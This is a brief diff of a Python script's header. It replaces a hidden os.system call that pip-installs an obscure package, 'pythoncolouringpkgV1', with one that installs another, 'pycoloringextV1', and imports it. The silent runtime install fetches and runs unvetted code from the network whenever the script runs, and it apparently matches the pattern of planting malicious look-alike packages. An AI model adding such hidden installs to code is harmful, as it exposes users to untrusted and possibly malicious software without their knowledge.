@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringpkgV1")
-import pythoncolouringpkgV1
+os.system("pip install pycoloringextV1")
+import pycoloringextV1
 import random
 import requests
 import time
